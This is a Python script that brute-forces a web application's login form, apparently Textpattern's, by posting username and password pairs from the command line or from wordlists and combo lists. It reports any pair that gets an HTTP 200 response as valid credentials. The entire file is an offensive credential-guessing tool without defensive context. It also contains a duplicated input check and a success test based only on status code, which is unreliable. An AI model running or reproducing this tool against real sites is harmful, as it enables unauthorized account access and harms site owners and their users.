import requests
import argparse
import sys
import os


def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', required=True, default=None, action='store', help='Target url')
	parser.add_argument('-u', '--user', required=False, default=None, action='store', help='User')
	parser.add_argument('-U', '--user_list', required=False, default=None, action='store', help='User list')
	parser.add_argument('-p', '--password', required=False, default=None, action='store', help='Password')
	parser.add_argument('-P', '--password_list', required=False, default=None, action='store', help='Password list')
	parser.add_argument('-UP', '--userpassword_list', required=False, default=None, action='store', help='List with format user:password')
	return parser


def test_passwords(pairs, target):
	s = requests.Session()
	s.get(target)
	for p_ in pairs:
		data = {"p_userid":p_[0], "p_password":p_[1], "_txp_token":""}
		req = s.post(target, data=data)
		if str(req.status_code) == "200":
			print("[+] Found credentials:   %s:%s <--- VALID CREDENTIALS"%(p_[0], p_[1]))
			sys.exit(0)
		else:
			print("[-] Invalid credentials: %s:%s"%(p_[0], p_[1]))


def main():
	# Get arguments
	args = get_args().parse_args()
	if (args.user is None and args.user_list is None and args.userpassword_list is None) or (args.password is None and args.password_list is None and args.userpassword_list is None):
		get_args().print_help()
		sys.exit(0)
	if (args.user_list is not None and not os.path.isfile(args.user_list)):
		print ("[!] Error: Use '-U' with a file of users or '-u' for a single user")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("[!] Error: Use '-P' with a file of passwords or '-p' for a single password")
		sys.exit(0)
	if (args.password_list is not None and not os.path.isfile(args.password_list)):
		print ("[!] Error: Use '-UP' with a file of usernames and passwords with the format username:password")
		sys.exit(0)

	# Create variables
	if args.userpassword_list is None:
		users =      [args.user] if args.user is not None else open(args.user_list).read().splitlines()
		passwords =  [args.password] if args.password is not None else open(args.password_list).read().splitlines()
		pairs =      [(u,p) for u in users for p in passwords]
	else:
		creds =      list(filter(None,[c for c in open(args.userpassword_list).read().splitlines()]))
		users =      [c.split(":")[0] for c in creds]
		passwords =  [c.split(":")[1] for c in creds]
		pairs =      [(c.split(":")[0],c.split(":")[1]) for c in creds]

	target = args.target
	test_passwords(pairs, target)


if __name__== "__main__":
	main()